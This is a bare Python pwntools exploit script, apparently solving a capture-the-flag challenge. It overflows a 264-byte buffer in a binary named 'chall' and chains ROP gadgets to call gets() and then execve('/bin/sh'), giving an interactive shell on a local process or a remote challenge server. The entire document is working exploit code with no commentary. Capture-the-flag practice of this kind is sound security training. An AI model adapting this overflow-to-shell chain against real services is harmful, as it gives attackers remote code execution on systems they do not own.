#!/usr/bin/env python3
from pwn import *

#--------Setup--------#

context(arch="amd64", os="linux")
elf = ELF("chall", checksec=False)

local = True
if local:
    r = elf.process()
else:
    host = "13.231.207.73"
    port = 9010
    r = remote(host, port)

#--------Addresses--------#

pop_rax = 0x0000000000400121
pop_rdi = 0x000000000040141c
pop_rsi_pop_r15 = 0x000000000040141a
pop_rdx = 0x00000000004023f5
syscall = 0x00000000004003fc

bss = elf.bss()
gets = 0x4004ee

#--------ret2syscall--------#

offset = 264

payload = flat(
    b"e" * offset,
    # Round 1: call gets(bss)
    pop_rdi, bss,
    gets,
    # Round 2: call execve("/bin/sh", 0, 0)
    pop_rax, 59,
    pop_rdi, bss,
    pop_rsi_pop_r15, 0, 0x13371337,
    pop_rdx, 0,
    syscall,
)

r.readuntil("What's your team name?\n")
r.sendline(payload)
r.sendline("/bin/sh\x00")
r.interactive()
